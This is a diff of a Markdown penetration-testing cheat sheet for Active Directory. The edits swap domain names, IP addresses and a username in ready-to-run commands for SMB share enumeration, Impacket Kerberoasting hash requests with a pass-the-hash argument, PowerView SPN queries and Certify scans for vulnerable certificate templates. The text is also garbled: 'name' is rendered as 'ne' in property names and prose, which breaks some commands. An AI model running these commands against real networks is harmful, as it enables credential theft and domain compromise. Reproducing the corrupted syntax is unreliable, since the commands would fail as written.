@@ -79,7 +79,7 @@
 - **Enumerate SMB Shares:**
   - **Command:**
     ```plaintext
-    .\SharpShares.exe /threads:50 /ldap:exclude-dc /filter:SYSVOL,NETLOGON,IPC$,PRINT$ /verbose /outfile:C:\Users\Rob\Desktop\n_shares.txt /dc:10.85.5.1 /domain:nm.ad.ABCDinternal.com
+    .\SharpShares.exe /threads:50 /ldap:exclude-dc /filter:SYSVOL,NETLOGON,IPC$,PRINT$ /verbose /outfile:C:\Users\Rob\Desktop\n_shares.txt /dc:10.8.5.1 /domain:nad.ABCDinternal.com
     ```
   - **Use Case:** Finds and lists SMB shares on the domain, excluding domain controllers and specific system shares.
 
@@ -90,21 +90,21 @@
 - **Request SPN Hashes with Impacket:**
   - **Command:**
     ```plaintext
-    impacket-GetUserSPNs -target-domain n.ad.testinternal.com -request -outputfile kerb_n.txt -hashes AAD3B435B51404EEAAD3B435B51404EE:<redacted> -dc-ip 10.1.1.27 test-globalx.com/bho
+    impacket-GetUserSPNs -target-domain ad.testinternal.com -request -outputfile kerb_n.txt -hashes AAD3B435B51404EE:<redacted> -dc-ip 10.1.1.27 test-globalx.com/bho
     ```
   - **Use Case:** Extracts service principal nes (SPNs) with associated hashes for Kerberoasting attacks.
 
 - **Find SPNs with PowerView:**
   - **Command:**
     ```powershell
-    Get-NetUser -SPN -Domain m.ad.testinternal.com -Server 10.7.1.2 | select serviceprincipalne
+    Get-NetUser -SPN -Domain ad.internal.com -Server 10.1.1.2 | select serviceprincipalne
     ```
   - **Use Case:** Enumerates users with SPNs in the domain.
 
 - **Filter Users Likely to Be Kerberoastable:**
   - **Command:**
     ```powershell
-    $kerberoastble = Get-DomainUser -SPN -Server MA2.n.ad.testinternal.com -Domain n.ad.testinternal.com
+    $kerberoastble = Get-DomainUser -SPN -Server ad.testinternal.com -Domain n.ad.test.com
     ```
   - **Use Case:** Identifies users with SPNs for potential Kerberoasting.
 
@@ -118,7 +118,7 @@
 - **Filter for Specific Users:**
   - **Command:**
     ```powershell
-    $kerb | where {$_.samaccountne -eq "admin0001"} | select -property memberof | fl
+    $kerb | where {$_.samaccountne -eq "adminkelly"} | select -property memberof | fl
     ```
   - **Use Case:** Filters specific users to see their group memberships.
 
@@ -161,7 +161,7 @@
 - **Find Vulnerable AD CS Configurations:**
   - **Command:**
     ```plaintext
-    .\Certify.exe find /vulnerable /domain:n.ad.testinternal.com /ldapserver:102.n.ad.testinternal.com
+    .\Certify.exe find /vulnerable /domain:n.ad.testinternal.com /ldapserver:102.ad.testinternal.com
     ```
   - **Use Case:** Finds vulnerable configurations in AD Certificate Services.
 
